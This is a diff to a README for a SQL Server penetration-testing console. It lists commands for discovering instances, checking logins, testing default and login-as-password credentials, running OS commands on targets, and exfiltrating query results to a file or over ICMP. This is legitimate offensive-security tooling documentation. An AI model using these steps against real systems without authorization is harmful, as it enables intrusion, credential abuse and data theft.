@@ -188,72 +188,82 @@ Below are some quick instructions for running ESC functions through PowerShell.
  ### Common Command Sequences <a name="recommendcommands"></a>
 Below are some common command examples to get you started.
 
- <strong>Targeting All Domain Instances</strong><br>
- `discover domainspn`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>
+<strong>Discovering SQL Server Instances</strong><br>
+Below are a few common methods to identify SQL Server on the network and domain without port scanning.
  
- `discover broadcast`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-Broadcast.png)<br>
+`discover domainspn`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>
+
+`discover broadcast`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-Broadcast.png)<br>
+
+`show discovered`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-Show.png)<br>
  
- `show discovered`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-Show.png)<br>
+<strong>Checking Access to Discovered Instances</strong><br>
+After discovery, `check access` can be used to determine if the current or provided credentials can login into the discovered SQL Server instances.
  
 ` set targetall enabled` <br>
 ` show settings`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-TargetAll.png)<br>
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-TargetAll.png)<br>
  
- `check access`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckAccess.png)<br>
+`check access`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckAccess.png)<br>
  
- `show access`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-ShowAccess.png)<br>
+`show access`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-ShowAccess.png)<br>
  
- <strong>Testing for Common Password Issues</strong><br>
 
- `check defaultpw`
-  [Related Reading](https://blog.netspi.com/attacking-application-specific-sql-server-instances/)
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckDefaultPw.png)<br>
+<strong>Testing for Common Password Issues</strong><br>
+Below are some checks for common password issues that can be used to gain initial entry and escalate privileges in some environments.
+
+`check defaultpw`
+`check defaultpw` is run against discovered instances and does not require valid credentials.
+[Related Reading](https://blog.netspi.com/attacking-application-specific-sql-server-instances/)
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckDefaultPw.png)<br>
  
- `check loginaspw`
- [Related Reading[(https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw1.png)<br>
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw2.png)<br>
+`check loginaspw`
+`check loginaspw` can be used once authenticated to enumerated all logins and test if they are using the login as the password.
+[Related Reading[(https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw1.png)<br>
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw2.png)<br>
  
-  <strong>Running OS Commands</strong><br>
- `run oscmd whoami`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/RunOsCmd1.png)<br>
+<strong>Running OS Commands</strong><br>
+Below is a ESC command for running OS commands on target instances.  It requires sysadmin privileges.
+
+`run oscmd whoami`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/RunOsCmd1.png)<br>
  
- <strong>Saving List of Accessible Servers</strong><br>
- The command below can be used to export a list of servers that you can log into.
- `export access c:\temp\access.csv`
-  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport1.png)<br>
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport2.png)<br>
+<strong>Saving List of Accessible Servers</strong><br>
+The command below can be used to export a list of servers that you can log into.
+`export access c:\temp\access.csv`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport1.png)<br>
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport2.png)<br>
  
- <strong>Data Exfiltration Example: Local File</strong><br>
- Below is an example of how to exfiltrate data to a local file.
+<strong>Data Exfiltration Example: Local File</strong><br>
+Below is an example of how to exfiltrate data to a local file.
  
- `set file enabled`
- `set filepath c:\temp\output.csv`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil1.png)<br>
+`set file enabled`
+`set filepath c:\temp\output.csv`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil1.png)<br>
  
- `select @@version`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil2.png)<br>
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil3.png)<br>
+`select @@version`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil2.png)<br>
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil3.png)<br>
  
- <strong>Data Exfiltration Example: ICMP</strong><br>
- Below is an example of how to exfiltrate data over ICMP with ESC.
+<strong>Data Exfiltration Example: ICMP</strong><br>
+Below is an example of how to exfiltrate data over ICMP with ESC.
  
- `set icmp enabled` <br>
- `set icmpip 192.168.1.1`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil1.png)<br>
+`set icmp enabled` <br>
+`set icmpip 192.168.1.1`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil1.png)<br>
  
-  `select @@version`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil12.png)<br>
- 
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil3.png)<br>
+`select @@version`
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil12.png)<br> 
+![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil3.png)<br>
 
  
- # Pending Commands <a name="pendingcommands"></a>
+# Pending Commands <a name="pendingcommands"></a>
 * Add discover local 
 * Add column find
 * Add domain account enumeration
